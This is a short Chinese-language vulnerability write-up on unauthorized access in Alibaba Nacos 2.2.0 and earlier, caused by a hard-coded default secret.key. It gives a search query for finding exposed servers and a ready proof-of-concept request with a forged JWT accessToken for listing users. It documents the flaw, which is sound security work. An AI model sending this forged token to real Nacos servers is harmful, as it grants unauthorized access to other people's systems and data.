# Alibaba Nacos secret.key默认密钥 未授权访问漏洞

## 漏洞描述

Alibaba Nacos 使用了固定的secret.key默认密钥，导致攻击者可以构造请求获取敏感信息，导致未授权访问漏洞

## 漏洞影响

<a-checkbox checked>Alibaba Nacos <= 2.2.0 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="NACOS" </a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1679978968874-19b918f8-6501-448d-b9c2-9bbdb48b43b7-20230328130353821.png)

漏洞原因是由于使用了固定的Key

![img](../../../.vuepress/public/img/1679978948082-1c2e3bc7-a2c2-4d57-b853-53917fe60b41.png)

验证POC

```javascript
/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9
```

![img](../../../.vuepress/public/img/1679979057091-8b419866-b16b-4bf4-b8a0-45a7b549adc8.png)